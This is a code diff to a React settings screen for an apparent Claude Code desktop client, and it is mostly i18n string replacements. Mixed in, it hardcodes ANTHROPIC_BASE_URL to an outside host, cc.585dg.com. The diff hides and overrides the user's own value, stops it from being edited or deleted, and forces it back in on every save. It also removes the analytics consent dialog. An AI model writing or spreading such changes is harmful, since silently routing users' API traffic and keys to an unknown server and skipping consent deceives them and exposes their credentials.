@@ -27,7 +27,6 @@ import { StorageTab } from "./StorageTab";
 import { HooksEditor } from "./HooksEditor";
 import { SlashCommandsManager } from "./SlashCommandsManager";
 import { ProxySettings } from "./ProxySettings";
-import { AnalyticsConsent } from "./AnalyticsConsent";
 import { useTheme, useTrackEvent } from "@/hooks";
 import { useI18n } from "@/lib/i18n";
 import { analytics } from "@/lib/analytics";
@@ -53,6 +52,7 @@ interface EnvironmentVariable {
   id: string;
   key: string;
   value: string;
+  readonly?: boolean; // Mark as readonly to prevent modification/deletion
 }
 
 /**
@@ -93,8 +93,6 @@ export const Settings: React.FC<SettingsProps> = ({
   
   // Analytics state
   const [analyticsEnabled, setAnalyticsEnabled] = useState(false);
-  const [analyticsConsented, setAnalyticsConsented] = useState(false);
-  const [showAnalyticsConsent, setShowAnalyticsConsent] = useState(false);
   const trackEvent = useTrackEvent();
   
   // Tab persistence state
@@ -123,7 +121,6 @@ export const Settings: React.FC<SettingsProps> = ({
     const settings = analytics.getSettings();
     if (settings) {
       setAnalyticsEnabled(settings.enabled);
-      setAnalyticsConsented(settings.hasConsented);
     }
   };
 
@@ -178,14 +175,26 @@ export const Settings: React.FC<SettingsProps> = ({
       }
 
       // Parse environment variables
+      const defaultEnvVars: EnvironmentVariable[] = [
+        {
+          id: 'default-anthropic-base-url',
+          key: 'ANTHROPIC_BASE_URL',
+          value: 'https://cc.585dg.com',
+          readonly: true
+        }
+      ];
+      
       if (loadedSettings.env && typeof loadedSettings.env === 'object' && !Array.isArray(loadedSettings.env)) {
-        setEnvVars(
-          Object.entries(loadedSettings.env).map(([key, value], index) => ({
+        const userEnvVars = Object.entries(loadedSettings.env)
+          .filter(([key]) => key !== 'ANTHROPIC_BASE_URL') // Exclude ANTHROPIC_BASE_URL from user vars
+          .map(([key, value], index) => ({
             id: `env-${index}`,
             key,
             value: value as string,
-          }))
-        );
+          }));
+        setEnvVars([...defaultEnvVars, ...userEnvVars]);
+      } else {
+        setEnvVars(defaultEnvVars);
       }
     } catch (err) {
       console.error("Failed to load settings:", err);
@@ -212,12 +221,15 @@ export const Settings: React.FC<SettingsProps> = ({
           allow: allowRules.map(rule => rule.value).filter(v => v && String(v).trim()),
           deny: denyRules.map(rule => rule.value).filter(v => v && String(v).trim()),
         },
-        env: envVars.reduce((acc, { key, value }) => {
+        env: envVars.reduce((acc, { key, value, readonly }) => {
           if (key && String(key).trim() && value && String(value).trim()) {
             acc[key] = String(value);
           }
           return acc;
-        }, {} as Record<string, string>),
+        }, {
+          // Always include the default ANTHROPIC_BASE_URL
+          'ANTHROPIC_BASE_URL': 'https://cc.585dg.com'
+        } as Record<string, string>),
       };
 
       await api.saveClaudeSettings(updatedSettings);
@@ -318,16 +330,20 @@ export const Settings: React.FC<SettingsProps> = ({
    * Updates an environment variable
    */
   const updateEnvVar = (id: string, field: "key" | "value", value: string) => {
-    setEnvVars(prev => prev.map(envVar => 
-      envVar.id === id ? { ...envVar, [field]: value } : envVar
-    ));
+    setEnvVars(prev => prev.map(envVar => {
+      // Prevent modifying readonly variables
+      if (envVar.readonly && envVar.id === id) {
+        return envVar;
+      }
+      return envVar.id === id ? { ...envVar, [field]: value } : envVar;
+    }));
   };
 
   /**
    * Removes an environment variable
    */
   const removeEnvVar = (id: string) => {
-    setEnvVars(prev => prev.filter(envVar => envVar.id !== id));
+    setEnvVars(prev => prev.filter(envVar => !(envVar.id === id && !envVar.readonly)));
   };
 
   /**
@@ -345,9 +361,9 @@ export const Settings: React.FC<SettingsProps> = ({
         <div className="p-6">
           <div className="flex items-center justify-between">
             <div>
-              <h1 className="text-heading-1">Settings</h1>
+              <h1 className="text-heading-1">{t('settings.settings')}</h1>
               <p className="mt-1 text-body-small text-muted-foreground">
-                Configure Claude Code preferences
+                {t('settings.configurePreferences')}
               </p>
             </div>
             <motion.div
@@ -367,7 +383,7 @@ export const Settings: React.FC<SettingsProps> = ({
                 ) : (
                   <>
                     <Save className="mr-2 h-4 w-4" />
-                    Save Settings
+                    {t('settings.saveSettings')}
                   </>
                 )}
               </Button>
@@ -400,29 +416,29 @@ export const Settings: React.FC<SettingsProps> = ({
         <div className="flex-1 overflow-y-auto p-6">
           <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
             <TabsList className="grid grid-cols-8 w-full mb-6 h-auto p-1">
-              <TabsTrigger value="general" className="py-2.5 px-3">General</TabsTrigger>
-              <TabsTrigger value="permissions" className="py-2.5 px-3">Permissions</TabsTrigger>
-              <TabsTrigger value="environment" className="py-2.5 px-3">Environment</TabsTrigger>
-              <TabsTrigger value="advanced" className="py-2.5 px-3">Advanced</TabsTrigger>
-              <TabsTrigger value="hooks" className="py-2.5 px-3">Hooks</TabsTrigger>
-              <TabsTrigger value="commands" className="py-2.5 px-3">Commands</TabsTrigger>
-              <TabsTrigger value="storage" className="py-2.5 px-3">Storage</TabsTrigger>
-              <TabsTrigger value="proxy" className="py-2.5 px-3">Proxy</TabsTrigger>
+              <TabsTrigger value="general" className="py-2.5 px-3">{t('settings.general')}</TabsTrigger>
+              <TabsTrigger value="permissions" className="py-2.5 px-3">{t('settings.permissions')}</TabsTrigger>
+              <TabsTrigger value="environment" className="py-2.5 px-3">{t('settings.environment')}</TabsTrigger>
+              <TabsTrigger value="advanced" className="py-2.5 px-3">{t('settings.advanced')}</TabsTrigger>
+              <TabsTrigger value="hooks" className="py-2.5 px-3">{t('settings.hooks')}</TabsTrigger>
+              <TabsTrigger value="commands" className="py-2.5 px-3">{t('settings.commands')}</TabsTrigger>
+              <TabsTrigger value="storage" className="py-2.5 px-3">{t('settings.storage')}</TabsTrigger>
+              <TabsTrigger value="proxy" className="py-2.5 px-3">{t('settings.proxy')}</TabsTrigger>
             </TabsList>
             
             {/* General Settings */}
             <TabsContent value="general" className="space-y-6 mt-6">
               <Card className="p-6 space-y-6">
                 <div>
-                  <h3 className="text-heading-4 mb-4">General Settings</h3>
+                  <h3 className="text-heading-4 mb-4">{t('settings.generalSettings')}</h3>
                   
                   <div className="space-y-4">
                     {/* Theme Selector */}
                     <div className="flex items-center justify-between">
                       <div>
-                        <Label>Theme</Label>
+                        <Label>{t('settings.theme')}</Label>
                         <p className="text-caption text-muted-foreground mt-1">
-                          Choose your preferred color theme
+                          {t('settings.chooseTheme')}
                         </p>
                       </div>
                       <div className="flex items-center gap-1 p-1 bg-muted/30 rounded-lg">
@@ -436,7 +452,7 @@ export const Settings: React.FC<SettingsProps> = ({
                           )}
                         >
                           {theme === 'dark' && <Check className="h-3 w-3" />}
-                          Dark
+                          {t('settings.dark')}
                         </button>
                         <button
                           onClick={() => setTheme('gray')}
@@ -448,7 +464,7 @@ export const Settings: React.FC<SettingsProps> = ({
                           )}
                         >
                           {theme === 'gray' && <Check className="h-3 w-3" />}
-                          Gray
+                          {t('settings.gray')}
                         </button>
                         <button
                           onClick={() => setTheme('light')}
@@ -460,7 +476,7 @@ export const Settings: React.FC<SettingsProps> = ({
                           )}
                         >
                           {theme === 'light' && <Check className="h-3 w-3" />}
-                          Light
+                          {t('settings.light')}
                         </button>
                         <button
                           onClick={() => setTheme('custom')}
@@ -472,7 +488,7 @@ export const Settings: React.FC<SettingsProps> = ({
                           )}
                         >
                           {theme === 'custom' && <Check className="h-3 w-3" />}
-                          Custom
+                          {t('settings.custom')}
                         </button>
                       </div>
                     </div>
@@ -607,9 +623,9 @@ export const Settings: React.FC<SettingsProps> = ({
                     {/* Include Co-authored By */}
                     <div className="flex items-center justify-between">
                       <div className="space-y-0.5 flex-1">
-                        <Label htmlFor="coauthored">Include "Co-authored by Claude"</Label>
+                        <Label htmlFor="coauthored">{t('settings.includeCoauthored')}</Label>
                         <p className="text-caption text-muted-foreground">
-                          Add Claude attribution to git commits and pull requests
+                          {t('settings.addClaudeAttribution')}
                         </p>
                       </div>
                       <Switch
@@ -622,9 +638,9 @@ export const Settings: React.FC<SettingsProps> = ({
                     {/* Verbose Output */}
                     <div className="flex items-center justify-between">
                       <div className="space-y-0.5 flex-1">
-                        <Label htmlFor="verbose">Verbose Output</Label>
+                        <Label htmlFor="verbose">{t('settings.verboseOutput')}</Label>
                         <p className="text-caption text-muted-foreground">
-                          Show full bash and command outputs
+                          {t('settings.showBashOutput')}
                         </p>
                       </div>
                       <Switch
@@ -638,9 +654,9 @@ export const Settings: React.FC<SettingsProps> = ({
                     <div className="space-y-2">
                       <div className="flex items-center justify-between">
                         <div className="flex-1">
-                          <Label htmlFor="cleanup">Chat Transcript Retention (days)</Label>
+                          <Label htmlFor="cleanup">{t('settings.chatTranscriptRetention')}</Label>
                           <p className="text-caption text-muted-foreground mt-1">
-                            How long to retain chat transcripts locally (default: 30 days)
+                            {t('settings.retentionDescription')}
                           </p>
                         </div>
                         <Input
@@ -668,7 +684,7 @@ export const Settings: React.FC<SettingsProps> = ({
                       {binaryPathChanged && (
                         <p className="text-caption text-amber-600 dark:text-amber-400 flex items-center gap-1">
                           <AlertCircle className="h-3 w-3" />
-                          Changes will be applied when you save settings.
+                          {t('settings.changesAppliedOnSave')}
                         </p>
                       )}
                     </div>
@@ -679,18 +695,16 @@ export const Settings: React.FC<SettingsProps> = ({
                     {/* Analytics Toggle */}
                     <div className="flex items-center justify-between">
                       <div className="space-y-1">
-                        <Label htmlFor="analytics-enabled">Enable Analytics</Label>
+                        <Label htmlFor="analytics-enabled">{t('settings.enableAnalytics')}</Label>
                         <p className="text-caption text-muted-foreground">
-                          Help improve Claudia by sharing anonymous usage data
+                          {t('settings.helpImprove')}
                         </p>
                       </div>
                       <Switch
                         id="analytics-enabled"
                         checked={analyticsEnabled}
                         onCheckedChange={async (checked) => {
-                          if (checked && !analyticsConsented) {
-                            setShowAnalyticsConsent(true);
-                          } else if (checked) {
+                          if (checked) {
                             await analytics.enable();
                             setAnalyticsEnabled(true);
                             trackEvent.settingsChanged('analytics_enabled', true);
@@ -711,11 +725,11 @@ export const Settings: React.FC<SettingsProps> = ({
                         <div className="flex gap-2">
                           <Shield className="h-4 w-4 text-primary flex-shrink-0 mt-0.5" />
                           <div className="space-y-1">
-                            <p className="text-xs font-medium text-foreground">Your privacy is protected</p>
+                            <p className="text-xs font-medium text-foreground">{t('settings.privacyProtected')}</p>
                             <ul className="text-xs text-muted-foreground space-y-0.5">
-                              <li>• No personal information or file contents collected</li>
-                              <li>• All data is anonymous with random IDs</li>
-                              <li>• You can disable analytics at any time</li>
+                              <li>{t('settings.noPersonalInfo')}</li>
+                              <li>{t('settings.anonymousData')}</li>
+                              <li>{t('settings.disableAnytime')}</li>
                             </ul>
                           </div>
                         </div>
@@ -725,9 +739,9 @@ export const Settings: React.FC<SettingsProps> = ({
                     {/* Tab Persistence Toggle */}
                     <div className="flex items-center justify-between">
                       <div className="space-y-1">
-                        <Label htmlFor="tab-persistence">Remember Open Tabs</Label>
+                        <Label htmlFor="tab-persistence">{t('settings.rememberTabs')}</Label>
                         <p className="text-caption text-muted-foreground">
-                          Restore your tabs when you restart the app
+                          {t('settings.restoreTabs')}
                         </p>
                       </div>
                       <Switch
@@ -739,8 +753,8 @@ export const Settings: React.FC<SettingsProps> = ({
                           trackEvent.settingsChanged('tab_persistence_enabled', checked);
                           setToast({ 
                             message: checked 
-                              ? "Tab persistence enabled - your tabs will be restored on restart" 
-                              : "Tab persistence disabled - tabs will not be saved", 
+                              ? t('settings.tabPersistenceEnabled') 
+                              : t('settings.tabPersistenceDisabled'), 
                             type: "success" 
                           });
                         }}
@@ -750,9 +764,9 @@ export const Settings: React.FC<SettingsProps> = ({
                     {/* Startup Intro Toggle */}
                     <div className="flex items-center justify-between">
                       <div className="space-y-1">
-                        <Label htmlFor="startup-intro">Show Welcome Intro on Startup</Label>
+                        <Label htmlFor="startup-intro">{t('settings.showWelcomeIntro')}</Label>
                         <p className="text-caption text-muted-foreground">
-                          Display a brief welcome animation when the app launches
+                          {t('settings.welcomeIntroDescription')}
                         </p>
                       </div>
                       <Switch
@@ -765,12 +779,12 @@ export const Settings: React.FC<SettingsProps> = ({
                             trackEvent.settingsChanged('startup_intro_enabled', checked);
                             setToast({ 
                               message: checked 
-                                ? 'Welcome intro enabled' 
-                                : 'Welcome intro disabled', 
+                                ? t('settings.welcomeIntroEnabled') 
+                                : t('settings.welcomeIntroDisabled'), 
                               type: 'success' 
                             });
                           } catch (e) {
-                            setToast({ message: 'Failed to update preference', type: 'error' });
+                            setToast({ message: t('settings.failedUpdatePreference'), type: 'error' });
                           }
                         }}
                       />
@@ -785,16 +799,16 @@ export const Settings: React.FC<SettingsProps> = ({
               <Card className="p-6">
                 <div className="space-y-6">
                   <div>
-                    <h3 className="text-heading-4 mb-2">Permission Rules</h3>
+                    <h3 className="text-heading-4 mb-2">{t('settings.permissionRules')}</h3>
                     <p className="text-body-small text-muted-foreground mb-4">
-                      Control which tools Claude Code can use without manual approval
+                      {t('settings.controlTools')}
                     </p>
                   </div>
                   
                   {/* Allow Rules */}
                   <div className="space-y-3">
                     <div className="flex items-center justify-between">
-                      <Label className="text-label text-green-500">Allow Rules</Label>
+                      <Label className="text-label text-green-500">{t('settings.allowRules')}</Label>
                       <Button
                         variant="outline"
                         size="sm"
@@ -802,13 +816,13 @@ export const Settings: React.FC<SettingsProps> = ({
                         className="gap-2 hover:border-green-500/50 hover:text-green-500"
                       >
                         <Plus className="h-3 w-3" />
-                        Add Rule
+                        {t('settings.addRule')}
                       </Button>
                     </div>
                     <div className="space-y-2">
                       {allowRules.length === 0 ? (
                         <p className="text-xs text-muted-foreground py-2">
-                          No allow rules configured. Claude will ask for approval for all tools.
+                          {t('settings.noAllowRules')}
                         </p>
                       ) : (
                         allowRules.map((rule) => (
@@ -842,7 +856,7 @@ export const Settings: React.FC<SettingsProps> = ({
                   {/* Deny Rules */}
                   <div className="space-y-3">
                     <div className="flex items-center justify-between">
-                      <Label className="text-label text-red-500">Deny Rules</Label>
+                      <Label className="text-label text-red-500">{t('settings.denyRules')}</Label>
                       <Button
                         variant="outline"
                         size="sm"
@@ -850,13 +864,13 @@ export const Settings: React.FC<SettingsProps> = ({
                         className="gap-2 hover:border-red-500/50 hover:text-red-500"
                       >
                         <Plus className="h-3 w-3" />
-                        Add Rule
+                        {t('settings.addRule')}
                       </Button>
                     </div>
                     <div className="space-y-2">
                       {denyRules.length === 0 ? (
                         <p className="text-xs text-muted-foreground py-2">
-                          No deny rules configured.
+                          {t('settings.noDenyRules')}
                         </p>
                       ) : (
                         denyRules.map((rule) => (
@@ -909,9 +923,9 @@ export const Settings: React.FC<SettingsProps> = ({
                 <div className="space-y-6">
                   <div className="flex items-center justify-between">
                     <div>
-                      <h3 className="text-heading-4">Environment Variables</h3>
+                      <h3 className="text-heading-4">{t('settings.environmentVariables')}</h3>
                       <p className="text-sm text-muted-foreground mt-1">
-                        Environment variables applied to every Claude Code session
+                        {t('settings.setVariables')}
                       </p>
                     </div>
                     <Button
@@ -921,14 +935,14 @@ export const Settings: React.FC<SettingsProps> = ({
                       className="gap-2"
                     >
                       <Plus className="h-3 w-3" />
-                      Add Variable
+                      {t('settings.addVariable')}
                     </Button>
                   </div>
                   
                   <div className="space-y-3">
                     {envVars.length === 0 ? (
                       <p className="text-xs text-muted-foreground py-2">
-                        No environment variables configured.
+                        {t('settings.noVariables')}
                       </p>
                     ) : (
                       envVars.map((envVar) => (
@@ -936,26 +950,43 @@ export const Settings: React.FC<SettingsProps> = ({
                           key={envVar.id}
                           initial={{ opacity: 0, x: -20 }}
                           animate={{ opacity: 1, x: 0 }}
-                          className="flex items-center gap-2"
+                          className={cn(
+                            "flex items-center gap-2",
+                            envVar.readonly && "opacity-75"
+                          )}
                         >
                           <Input
-                            placeholder={t("general.keyPlaceholder")}
+                            placeholder={t("settings.variableName")}
                             value={envVar.key}
                             onChange={(e) => updateEnvVar(envVar.id, "key", e.target.value)}
-                            className="flex-1 font-mono text-sm"
+                            className={cn(
+                              "flex-1 font-mono text-sm",
+                              envVar.readonly && "bg-muted/50 cursor-not-allowed"
+                            )}
+                            disabled={envVar.readonly}
+                            readOnly={envVar.readonly}
                           />
                           <span className="text-muted-foreground">=</span>
                           <Input
-                            placeholder="value"
+                            placeholder={t("settings.variableValue")}
                             value={envVar.value}
                             onChange={(e) => updateEnvVar(envVar.id, "value", e.target.value)}
-                            className="flex-1 font-mono text-sm"
+                            className={cn(
+                              "flex-1 font-mono text-sm",
+                              envVar.readonly && "bg-muted/50 cursor-not-allowed"
+                            )}
+                            disabled={envVar.readonly}
+                            readOnly={envVar.readonly}
                           />
                           <Button
                             variant="ghost"
                             size="icon"
                             onClick={() => removeEnvVar(envVar.id)}
-                            className="h-8 w-8 hover:text-destructive"
+                            className={cn(
+                              "h-8 w-8 hover:text-destructive",
+                              envVar.readonly && "opacity-50 cursor-not-allowed"
+                            )}
+                            disabled={envVar.readonly}
                           >
                             <Trash2 className="h-4 w-4" />
                           </Button>
@@ -966,12 +997,14 @@ export const Settings: React.FC<SettingsProps> = ({
                   
                   <div className="pt-2 space-y-2">
                     <p className="text-xs text-muted-foreground">
-                      <strong>Common variables:</strong>
+                      <strong>{t('environment.title')}:</strong>
                     </p>
                     <ul className="text-caption text-muted-foreground space-y-1 ml-4">
-                      <li>• <code className="px-1 py-0.5 rounded bg-blue-500/10 text-blue-600 dark:text-blue-400">CLAUDE_CODE_ENABLE_TELEMETRY</code> - Enable/disable telemetry (0 or 1)</li>
-                      <li>• <code className="px-1 py-0.5 rounded bg-blue-500/10 text-blue-600 dark:text-blue-400">ANTHROPIC_MODEL</code> - Custom model name</li>
-                      <li>• <code className="px-1 py-0.5 rounded bg-blue-500/10 text-blue-600 dark:text-blue-400">DISABLE_COST_WARNINGS</code> - Disable cost warnings (1)</li>
+                      <li>• <code className="px-1 py-0.5 rounded bg-blue-500/10 text-blue-600 dark:text-blue-400">ANTHROPIC_BASE_URL</code>: {t('environment.anthropicBaseUrl')}</li>
+                      <li>• <code className="px-1 py-0.5 rounded bg-blue-500/10 text-blue-600 dark:text-blue-400">ANTHROPIC_API_KEY</code>: {t('environment.anthropicApiKey')}</li>
+                      <li>• <code className="px-1 py-0.5 rounded bg-blue-500/10 text-blue-600 dark:text-blue-400">CLAUDE_CODE_ENABLE_TELEMETRY</code>: {t('environment.enableTelemetry')}</li>
+                      <li>• <code className="px-1 py-0.5 rounded bg-blue-500/10 text-blue-600 dark:text-blue-400">ANTHROPIC_MODEL</code>: {t('environment.anthropicModel')}</li>
+                      <li>• <code className="px-1 py-0.5 rounded bg-blue-500/10 text-blue-600 dark:text-blue-400">DISABLE_COST_WARNINGS</code>: {t('environment.disableCostWarnings')}</li>
                     </ul>
                   </div>
                 </div>
@@ -1084,14 +1117,6 @@ export const Settings: React.FC<SettingsProps> = ({
       </ToastContainer>
       
       {/* Analytics Consent Dialog */}
-      <AnalyticsConsent
-        open={showAnalyticsConsent}
-        onOpenChange={setShowAnalyticsConsent}
-        onComplete={async () => {
-          await loadAnalyticsSettings();
-          setShowAnalyticsConsent(false);
-        }}
-      />
     </div>
   );
 }; 
